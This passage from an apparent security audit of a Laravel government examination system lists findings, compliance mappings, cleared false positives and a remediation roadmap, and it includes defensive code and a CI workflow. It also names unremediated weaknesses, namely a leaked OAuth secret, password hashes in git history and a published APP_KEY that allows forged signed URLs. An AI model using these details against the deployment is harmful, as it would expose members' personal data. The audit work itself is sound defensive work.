**Remediation:** store a `hash('sha256', $token)` and look up by hash, keeping the plaintext only in the generated URL; emit `Referrer-Policy: no-referrer` on scanner pages (covered by SEC-03); and consider shortening the maximum expiry from 7 days to 24 hours, which matches the stated single-examination-day use.

---

### ⚪ SEC-22 — `composer setup` produces an insecure default installation

**Status:** ✅ Verified · `composer.json:44-51`, `.env.example:2,4`

The documented setup path copies `.env.example` to `.env`, yielding `APP_ENV=local`, `APP_DEBUG=true`, `DB_USERNAME=root`, `DB_PASSWORD=` (empty), and `MAIL_MAILER=log`. `key:generate` does run, so the committed `APP_KEY` is replaced — but every other insecure default persists. Provide a distinct `.env.production.example`, and extend `app/Console/Commands/Preflight.php` to fail the deployment when `APP_DEBUG` is true in production.

---

### ⚪ SEC-23 — Third-party font origin with no Subresource Integrity

**Status:** ✅ Verified · `resources/views/app.blade.php:41`, `Vite::fonts()`

`<link rel="preconnect" href="https://fonts.bunny.net">` introduces a third-party origin into every page load. With no CSP (SEC-03) and no SRI, a compromise of that host, or DNS interception, permits arbitrary CSS injection. Self-hosting the fonts under `/public/fonts` removes the dependency entirely — the project already has a `storage/fonts` directory and a fonts manifest, suggesting the machinery is partly in place.

---

### ⚪ SEC-24 — Health endpoint exposed without restriction

**Status:** ✅ Verified · `bootstrap/app.php:20` — `health: '/up'`

`GET /up` is public and unauthenticated. Laravel's health route boots the framework and confirms the app is alive; it does not leak configuration, so the disclosure is minimal. For a government deployment, restrict it to the load balancer's source range at the web-server layer, and exclude it from public DNS/WAF exposure.

---

### ⚪ SEC-25 — No CI/CD security gates present

**Status:** ✅ Verified · no `.github/`, `.gitlab-ci.yml`, `Dockerfile`, or deployment script found in the repository

There is no automated pipeline, so there is nothing enforcing the checks this report recommends. Given a test suite of 67 files already exists, the marginal cost of a pipeline is low:

```yaml
# .github/workflows/ci.yml
name: CI
on: [push, pull_request]
jobs:
  security:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with: { fetch-depth: 0 }
      - uses: shivammathur/setup-php@v2
        with: { php-version: '8.3' }
      - run: composer install --no-interaction --prefer-dist
      - run: composer audit                    # fails on any advisory
      - run: npm ci && npm audit --omit=dev
      - run: vendor/bin/pint --test            # already a dev dependency
      - run: php artisan test
      - uses: gitleaks/gitleaks-action@v2      # blocks SEC-01 recurring
```

---

### ⚪ SEC-26 — JSON endpoints outside `api/*` return redirects on validation failure

| | |
|---|---|
| **Severity** | Informational (robustness, not security) |
| **Status** | ✅ Verified during remediation testing |

**Affected file:** `bootstrap/app.php:40-42`

```php
$exceptions->shouldRenderJsonWhen(
    fn (Request $request) => $request->is('api/*'),
);
```

The application has no `api/*` routes, but it does have JSON endpoints —
`evaluations.search`, `evaluations.resolve`, `email-logs.show` — reached by `fetch()`.
Because the predicate above replaces Laravel's default (which honours
`Accept: application/json`), a validation failure on those endpoints returns a **302
redirect to the previous URL** rather than a 422 with an errors payload, even when the
caller asked for JSON. The front-end `fetch()` receives an HTML redirect it has no
handling for, so a rejected search fails silently rather than showing the message.

Surfaced while writing the test for SEC-04's `min:4` rule, which is why the test asserts
a redirect-with-errors instead of a 422.

**Remediation**
```php
$exceptions->shouldRenderJsonWhen(
    // The app has no api/* routes, but it does have fetch()-driven JSON
    // endpoints. Honour what the caller actually asked for.
    fn (Request $request) => $request->is('api/*') || $request->expectsJson(),
);
```
Deliberately left unchanged for now: it alters the error-handling contract of every
endpoint at once, and wants its own regression pass across the Inertia forms rather
than being folded into a security fix.

---

## 4. OWASP Top 10 (2021) Mapping

| Category | Findings | Status |
|---|---|---|
| **A01 Broken Access Control** | SEC-02, SEC-04, SEC-05, SEC-16, SEC-17 | ⚠️ Strong policy layer; public endpoints are the gap |
| **A02 Cryptographic Failures** | SEC-01, SEC-02, SEC-07 | ❌ Committed keys; cookies not Secure by default |
| **A03 Injection** | SEC-08, SEC-09, SEC-10 | ⚠️ SQL clean; HTML-in-email and spreadsheet formula gaps |
| **A04 Insecure Design** | SEC-05, SEC-12 | ⚠️ Public evaluation flow lacks a credential |
| **A05 Security Misconfiguration** | SEC-03, SEC-07, SEC-22, SEC-24 | ❌ No security headers; unsafe example env |
| **A06 Vulnerable Components** | SEC-06 | ❌ 13 Composer advisories |
| **A07 Auth Failures** | SEC-11, SEC-14, SEC-15 | ⚠️ Lockout and throttling good; enumeration and weak policy |
| **A08 Software/Data Integrity** | SEC-23, SEC-25 | ⚠️ No CI gates, no SRI |
| **A09 Logging & Monitoring** | SEC-13, SEC-18, SEC-19 | ⚠️ Good audit trail, no detection |
| **A10 SSRF** | SEC-06 (PHPSpreadsheet CVE-2026-59931) | ✅ No first-party SSRF sink found |

## 5. CWE Mapping

| CWE | Description | Findings |
|---|---|---|
| CWE-798 / CWE-540 | Hard-coded credentials in source | SEC-01 |
| CWE-538 / CWE-359 | Sensitive info in accessible file / private info exposure | SEC-02 |
| CWE-693 / CWE-1021 | Protection mechanism failure / clickjacking | SEC-03 |
| CWE-200 / CWE-639 / CWE-307 | Information exposure / IDOR / missing rate limit | SEC-04 |
| CWE-306 / CWE-639 | Missing authentication for critical function | SEC-05 |
| CWE-1395 / CWE-918 / CWE-400 | Vulnerable component / SSRF / resource exhaustion | SEC-06, SEC-20 |
| CWE-614 / CWE-319 / CWE-1004 | Cookie without Secure / cleartext transmission | SEC-07 |
| CWE-434 / CWE-79 | Unrestricted upload / stored XSS | SEC-08 |
| CWE-80 | Improper neutralization of HTML tags | SEC-09 |
| CWE-1236 | Formula injection in CSV/XLSX | SEC-10 |
| CWE-287 | Improper authentication | SEC-11 |
| CWE-524 / CWE-525 | Cache containing sensitive information | SEC-12 |
| CWE-532 / CWE-922 | Sensitive info in logs / insecure storage | SEC-13, SEC-18 |
| CWE-204 | Observable response discrepancy | SEC-14 |
| CWE-521 | Weak password requirements | SEC-15 |
| CWE-1220 / CWE-269 | Access-control granularity / privilege management | SEC-16, SEC-17 |
| CWE-778 | Insufficient logging | SEC-19 |
| CWE-598 / CWE-522 | Sensitive data in URL / unprotected credentials | SEC-21 |

---

## 6. Laravel Security Checklist Results

| Control | Status | Evidence |
|---|---|---|
| CSRF protection | ✅ Pass | Default `web` group; no `except` list anywhere; Inertia sends `X-XSRF-TOKEN` |
| Mass assignment | ✅ Pass | Every model declares `#[Fillable([...])]` (Laravel 13 attribute); no `$request->all()` reaching `create`/`update` |
| Hidden attributes | ✅ Pass | `#[Hidden(['password', 'remember_token'])]` on `User` |
| Password hashing | ✅ Pass | `'password' => 'hashed'` cast; `BCRYPT_ROUNDS=12` |
| Authorization policies | ✅ Pass | 21 policies with jurisdiction scoping; `Gate::authorize` used consistently |
| Form Request validation | ✅ Pass | 6 form requests + inline `validate()` on every write endpoint reviewed |
| Signed URLs | ✅ Pass | `URL::temporarySignedRoute`, 7-day expiry, `signed` middleware on both routes |
| Storage security | ✅ Pass | `storage/app/private`; `ServeFile` requires a valid relative signature for private disks (verified in framework source) |
| Storage symlink | ✅ Pass | `public/storage` gitignored; only the `public` disk is symlinked |
| Session driver | ✅ Pass | `database`, JSON serialization (not `php` — no gadget-chain surface) |
| Session regeneration | ✅ Pass | `regenerate()` on login, `invalidate()` + `regenerateToken()` on logout |
| Rate limiting — login | ✅ Pass | 5 attempts/identifier+IP + persistent 15-minute account lockout |
| Rate limiting — password reset | ✅ Pass | `throttle:5,1` on both routes |
| Rate limiting — public QR | ✅ Pass | `throttle:10,1`, with documented reasoning |
| Rate limiting — evaluation | ❌ **Fail** | SEC-04 |
| Rate limiting — exports | ❌ **Fail** | SEC-20 |
| Secure cookies | ❌ **Fail** | SEC-07 |
| Trusted proxies / hosts | ❌ **Fail** | SEC-07 |
| Security headers | ❌ **Fail** | SEC-03 |
| Encryption at rest | ⚠️ Partial | `date_of_birth` encrypted; `email`, `mobile_number` are not |
| Exception handling | ✅ Pass | Custom handler; debug output suppressed when `APP_DEBUG=false` |
| Queue / jobs | ✅ Pass | `SendAssignmentConfirmation` takes IDs, not serialized user input |
| Scheduled tasks | ✅ Pass | Three scheduled commands, no user-controlled arguments |
| Sanctum / Passport | N/A | No API tokens; session guard only |
| Broadcasting | N/A | `BROADCAST_CONNECTION=log` |

---

## 7. Domain Reviews

### 7.1 Authentication Review

**Strengths.** Dual-identifier login (username or email) with correct `filter_var` discrimination. Per-identifier+IP throttling *and* a persistent 15-minute account lockout after 5 failures — belt and braces. Session regenerated on login, invalidated and token-regenerated on logout. `must_change_password` enforced globally by middleware with a correctly minimal allow-list (`password.edit`, `password.update`, `logout`). Password reset via Laravel's broker with a 60-minute expiry and a constant, non-enumerable response. Admin-initiated resets email a signed link rather than exposing a generated password to the administrator — a good detail. Blacklist and deactivation are enforced on both the password and Google paths.

**Gaps.** Account-state disclosure before credential verification (SEC-14). OAuth linking on unverified email (SEC-11). Weak password floor with no breach check (SEC-15). No MFA. `Auth::login($user, remember: true)` is unconditional on the Google path. No concurrent-session limit or device management — a stolen session cookie is valid for its full 120-minute idle lifetime with no way for a user or administrator to revoke it.

### 7.2 Authorization Review

The strongest area of the codebase. Every authenticated route sits inside `middleware(['auth', 'password.changed'])`, and privileged groups carry explicit `role:` lists. 21 policies implement jurisdiction scoping through `scopedTestingCenterIds()`, with genuinely careful distinctions — `MemberPolicy` separates *viewing* a region-wide member (any office) from *managing* one (no office), and documents why. `CertificatePolicy::decide()` requires three independent conditions. Own-record access is checked explicitly rather than assumed (`MyProctadController::respondToAssignment:356`, `CertificatePolicy::download:73`).

Horizontal escalation was tested against the scoping helpers and holds for the authenticated surface. The failures are all on the **public** surface: `EvaluationController::resolve()` and `store()` have no caller-side authorization at all (SEC-04, SEC-05).

Structural concern: authorization lives in two places that can drift (SEC-16), and `UserPolicy::update()` does not consult its target (SEC-17).

### 7.3 API Security Review

There is no separate API surface — no `routes/api.php`, no Sanctum, no Passport. `bootstrap/app.php:40-42` configures JSON rendering for `api/*`, but no such routes exist. Three endpoints return JSON to `fetch()` callers (`evaluations.search`, `evaluations.resolve`, `email-logs.show`); the first two are the subject of SEC-04. This narrow surface is a deliberate and sound design decision — it removes an entire category of token-management risk.

### 7.4 File Upload Security Review

| Control | Status |
|---|---|
| Extension allow-list | ✅ `Rule::file()->types([...])` / `mimes:` on every upload |
| MIME validation | ✅ Laravel validates the real MIME, not the client-supplied one |
| Size limits | ✅ 2 MB photos, 5 MB documents |
| Filename sanitization | ✅ `->store()` generates a random hashed name; the original is never used |
| Path traversal | ✅ No user input reaches a storage path; `{member->id}` is an integer PK |
| Storage isolation | ✅ `storage/app/private`, outside the web root, signature-gated |
| Executable prevention | ✅ No `php`/`phtml` in any allow-list; storage is non-executable |
| Double extension | ✅ Moot — stored filenames are generated |
| SVG upload | ✅ Excluded by Laravel 13's `image` rule default (verified in framework source) |
| Content re-encoding | ❌ Images stored as uploaded (SEC-08) |
| Virus scanning | ❌ None — members upload arbitrary PDFs as eligibility documents |
| Inline serving | ⚠️ Photos served inline without `nosniff` (SEC-08) |

Overall this is handled well. The recommendation beyond SEC-08 is ClamAV scanning on the member-requirement upload path, since those files are opened by staff on CSC workstations.

### 7.5 Database Security Review

Parameterization is complete — every `whereRaw`, `selectRaw` and `havingRaw` in the codebase uses bindings or enum-derived literals. `EvaluationMonitoringController::roleSeniorityOrdering()` interpolates into `orderByRaw`, but the interpolated values come from `ExamRole::evaluableCases()`, a PHP enum: no caller-controlled path exists, and the docblock states this explicitly. **This is a false positive for SQL injection.**

`date_of_birth` is encrypted at rest with an explanatory comment about RA 10173 — and `RegisteredUserController:130-136` shows the team understood the consequence (a random IV means no `WHERE` clause can match, so the duplicate check narrows by name in SQL and compares dates in PHP). That is careful work.

Gaps: `email`, `mobile_number` and `agency` are stored in plaintext; `DB_USERNAME=root` in the example env implies the application connects with database superuser rights (it should have a least-privilege account with no `DROP`/`GRANT`); no TLS is configured for the database connection (`MYSQL_ATTR_SSL_CA` is unset); soft deletes retain PII indefinitely with no retention policy.

### 7.6 Configuration & Infrastructure Review

No Docker, Nginx, Apache vhost, or deployment script is present in the repository, so infrastructure could not be assessed directly. `public/.htaccess` is the stock Laravel file — it correctly sets `Options -Indexes` (no directory listing) and routes everything through `index.php`, but adds no headers.

**Deployment requirements not evidenced anywhere in the repository, and therefore to be verified before go-live:**
- Document root must be `public/`, never the project root — otherwise `.env`, `legacy_proctad_db.sql` and `storage/` are directly fetchable
- `storage/` and `bootstrap/cache/` writable by the web user; nothing else should be
- PHP: `expose_php=Off`, `display_errors=Off`, `allow_url_fopen=Off`
- TLS 1.2+ with a valid certificate; HTTP→HTTPS redirect at the web server
- `php artisan config:cache route:cache view:cache` and `composer install --no-dev --optimize-autoloader` in the deploy step

### 7.7 Secrets Exposure Audit

| Location | Finding |
|---|---|
| `.env.example:63` | 🔴 Live Google OAuth client secret |
| `.env.example:62` | 🔴 Google OAuth client ID |
| `.env.example:3` | 🔴 Real `APP_KEY` |
| `legacy_proctad_db.sql` | 🔴 61 bcrypt hashes, 185 emails, staff PII |
| `.env` (working tree) | ✅ Correctly gitignored; never committed (`git log -- .env` is empty) |
| `app/`, `config/`, `resources/` | ✅ No hardcoded credentials; all secrets read via `env()` in config files only |
| Private keys / certificates | ✅ None present; `/storage/*.key` is gitignored |

### 7.8 Cryptography Assessment

| Control | Status |
|---|---|
| Password hashing | ✅ bcrypt, cost 12, via the `hashed` cast |
| Application encryption | ✅ AES-256-CBC (Laravel default) with a proper `APP_KEY` |
| PII at rest | ⚠️ `date_of_birth` only |
| Token generation | ✅ `Str::random(40)` (CSPRNG), `random_int` for PROCTAD IDs with an unambiguous charset |
| Signed URLs | ✅ HMAC-SHA256 via the framework |
| Transport | ❌ No HTTPS enforcement, no HSTS (SEC-07, SEC-03) |
| Session encryption | ❌ Disabled by default |
| Key rotation | ❌ No documented procedure; SEC-01 makes one necessary |

### 7.9 Privacy / RA 10173 Compliance Gaps

| Requirement | Status | Note |
|---|---|---|
| Lawful basis / consent | ✅ | Terms acceptance required at registration (`'terms' => ['accepted']`) |
| Privacy notice | ✅ | `/privacy-policy` route present |
| Data minimization | ⚠️ | The public scanner correctly withholds status and agency (`ScannerController:113-117`) — good. `EvaluationController::resolve()` does the opposite (SEC-04) |
| Encryption of PII | ⚠️ | `date_of_birth` only; email, mobile, agency in plaintext |
| Breach notification readiness | ❌ | No incident response plan; SEC-02 is a likely notifiable event *today* |
| Retention & disposal | ❌ | Soft deletes retain PII indefinitely; no schedule for `audit_logs` or `email_logs` |
| Access logging | ⚠️ | Writes audited; **reads are not** — no record of who viewed which member's PII |
| Data subject rights | ❌ | No export or erasure mechanism for a member's own data |
| Sensitive personal information | ⚠️ | Blacklist status is adverse SPI and is disclosed pre-authentication (SEC-14) |

---

## 8. False Positives / Cleared During Review

Documented so a subsequent assessor does not re-raise them:

| Candidate | Verdict | Evidence |
|---|---|---|
| **SQL injection via `orderByRaw`** | ❌ Not a vulnerability | `EvaluationMonitoringController:125-135` interpolates only `ExamRole` enum values; no user-controlled path |
| **Mass assignment unprotected** | ❌ Not a vulnerability | No `$fillable`/`$guarded` property exists because Laravel 13 uses the `#[Fillable]` **attribute** — present on all 31 models |
| **Public file access via `/storage/{path}`** | ❌ Not a vulnerability | `local` disk has `serve => true`, but `ServeFile::hasValidSignature()` requires a valid relative signature for private disks (framework source verified). The `public` disk does not set `serve`, so no unsigned route is registered |
| **Unauthenticated upload via `PUT /storage/{path}`** | ❌ Not a vulnerability | `ReceiveFile::hasValidSignature()` requires both `upload=1` **and** a valid signature |
| **Blade XSS via `{!! $issuedLine !!}`** | ❌ Not a vulnerability | `certificates/certificate.blade.php:222`; the value is built at lines 168-170 from a `Carbon` date and a computed ordinal suffix. No user input; renders to PDF, not to a browser |
| **`v-html` / DOM XSS in Vue** | ❌ Not found | Repository-wide grep for `v-html`, `innerHTML`, `eval`, `Function(` across `resources/js` returns no matches |
| **dompdf RCE / SSRF** | ⚠️ Mitigated, not absent | `enable_php` and `enable_remote` both `false`, `chroot` set — but by vendor default, not by a pinned project config. See SEC-06 remediation |
| **CSRF bypass** | ❌ Not found | No `VerifyCsrfToken` `except` entries; all state-changing routes are POST/PUT/PATCH/DELETE inside the `web` group |
| **IDOR on `POST /notifications/{id}/read`** | ❌ Not a vulnerability | `NotificationController:12` scopes through `$request->user()->notifications()` |
| **Field-office scope bypass on report exports** | ❌ Not a vulnerability | `ReportController::resolveFilters():119-121` forces `$user->field_office_id` for FO-scoped roles, ignoring the request parameter |

---

## 9. Prioritized Remediation Roadmap

Superseded by the live tracker in **§0**, which carries the same items with their current
status. This section is retained for the original prioritisation and effort estimates.

### 🔴 Immediate — before any production deployment (1–2 days)

| # | Finding | Action | Effort | Status |
|---|---|---|---|---|
| 1 | SEC-01 | Revoke and rotate the Google OAuth secret in Cloud Console | 30 min | 🔒 §0 / 2.1 |
| 2 | SEC-01, SEC-02 | Purge `.env.example` secrets and all four `.sql` files from git history; force-push | 2 h | 🔒 §0 / 2.3 |
| 3 | SEC-02 | Force `must_change_password` for all migrated legacy accounts | 30 min | 🟡 command written, not yet run |
| 4 | SEC-02 | Notify the CSC Data Protection Officer; assess NPC notification | — | 🔒 §0 / 2.5 |
| 5 | SEC-03 | Add `SecurityHeaders` middleware (CSP in report-only first) | 3 h | ✅ |
| 6 | SEC-07 | `SESSION_SECURE_COOKIE`, `SESSION_ENCRYPT`, `APP_DEBUG=false`, `trustProxies`, `trustHosts`, `forceScheme` | 2 h | 🟡 code done; host config §0 / 3.1 |
| 7 | SEC-04 | Throttle and tighten `evaluations.search` / `evaluations.resolve` | 2 h | ✅ |
| 8 | SEC-05 | Bind evaluation submission to a credential; add the uniqueness constraint | 3 h | ✅ |
| 9 | SEC-06 | `composer update` the three packages; pin `config/dompdf.php`; `npm audit fix` | 2 h | ✅ |

### 🟠 Short-term — within 30 days

| # | Finding | Action | Status |
|---|---|---|---|
| 10 | SEC-09 | Escape substituted values in `EmailTemplate::render()` | ✅ |
| 11 | SEC-10 | Add the `EscapesFormulas` trait to all four exports | ✅ |
| 12 | SEC-11 | Require `email_verified`; refuse re-linking a bound account | ✅ |
| 13 | SEC-12 | Stop caching authenticated documents; purge caches on logout | ✅ |
| 14 | SEC-14 | Move account-state checks after credential verification | ✅ |
| 15 | SEC-15 | Raise the password floor to 12 chars with `uncompromised()` | ✅ |
| 16 | SEC-13 | Redact signed URLs from `email_logs`; set a retention window | 🟡 redaction ✅, retention ⬜ |
| 17 | SEC-08 | Pin content type and CSP on inline file responses | ✅ |
| 18 | SEC-25 | Stand up CI with `composer audit`, `npm audit`, `pint`, `php artisan test`, gitleaks | ⬜ |
| 19 | SEC-20 | Throttle exports; convert to chunked `FromQuery` | 🟡 throttle ✅, chunking ⬜ |

### 🔵 Long-term — within 90 days

See §0 checkpoint 5. SEC-18 (audit redaction) landed early and is ✅.

---

## 10. Final Recommendation

### 🔴 NOT READY FOR PRODUCTION — two blockers remain, both outside the codebase

**What has changed since the assessment.** Every finding that could be closed by changing
code has been closed: 4 of 5 High, all 8 Medium, and the configuration half of SEC-07.
The suite is at **618 passing** (up from 604 — 14 new tests covering the header middleware,
the evaluation authorization rules, the OAuth verification requirement, and the new
preflight gates), and both `composer audit` and `npm audit` are clean.

**What still blocks deployment.** Both Critical findings, and neither is a code change:

1. **The Google OAuth client secret has not been revoked.** Sanitising `.env.example` does
   not un-publish it — it is in the git history, and the secret is valid until someone
   revokes it in Cloud Console.
2. **The legacy dump and its 61 staff password hashes are still in the git history.**
   `git rm --cached` removes them from future commits; it does not remove them from the
   past. This requires a history rewrite and a force-push.

A third item is worth treating as blocking in practice: the working instance is running
on the `APP_KEY` that was published in `.env.example` (verified during this round). On any
environment still using that key, anyone with the repository can forge signed URLs to
private files and decrypt stored birth dates.

**Rationale for the verdict.** The application itself is now in good shape. The
authorization model was already well-designed and correctly implemented on the
authenticated surface; the public surface has been brought up to the same standard, and the
browser and transport hardening it lacked entirely is now present and tested. But an
exposed credential is exposed until it is rotated, and a DICT VAPT engagement handed this
repository would find both Critical items in the first hour. On a public government system
holding data covered by RA 10173, that is disqualifying regardless of how good the code is.

**Path to approval:**

1. Complete §0 checkpoint 2 — rotation and history purge. Half a day, mostly waiting.
2. Complete §0 checkpoint 3 on the live host, ending with `php artisan proctad:preflight` exiting 0.
3. Confirm with the DPO whether SEC-02 requires NPC notification.
4. Re-run this assessment against the hardened build and the rewritten history.

On completion of checkpoints 2 and 3, this system is expected to reach **Ready with Minor
Remediation** (estimated score 84/100), with checkpoint 4 closed out during the first
production cycle.

---

## Appendix A — Assessment Scope and Method

**Covered:** all of `app/` (186 PHP files), `bootstrap/`, `config/` (11 files), `routes/` (2 files, 482 lines), `database/`, `resources/` (Vue, Blade, JS, CSS), `public/`, `storage/` layout, `tests/` (67 files), `composer.json`/`.lock`, `package.json`/`.lock`, `.env.example`, `.gitignore`, `phpunit.xml`, `vite.config.js`, git history for secrets.

**Method:** manual source review of every controller, policy, middleware, model, service and console command; targeted pattern analysis for injection, XSS, IDOR, mass assignment, secrets and unsafe deserialization; framework source verification in `vendor/` for three claims that turned on framework behaviour (`ServeFile` signature enforcement, the `image` validation rule's SVG handling, Eloquent guarding defaults); `composer audit` and `npm audit` for dependency advisories; `git log -S` for historical secret exposure.

**Not covered — recommended for the VAPT engagement itself:**
- Dynamic testing against a running instance (all findings here are static; exploitability was reasoned from source, and each finding is marked Verified or Plausible accordingly)
- Web server, OS, TLS and network configuration — no infrastructure-as-code exists in this repository
- Third-party review of the `vendor/` tree beyond published advisories
- Social engineering and physical security
- Load and stress testing to confirm the DoS reasoning in SEC-20

**Severity model:** CVSS v3.1 base scores, estimated from source analysis without a running target. Scores should be re-derived during dynamic testing.
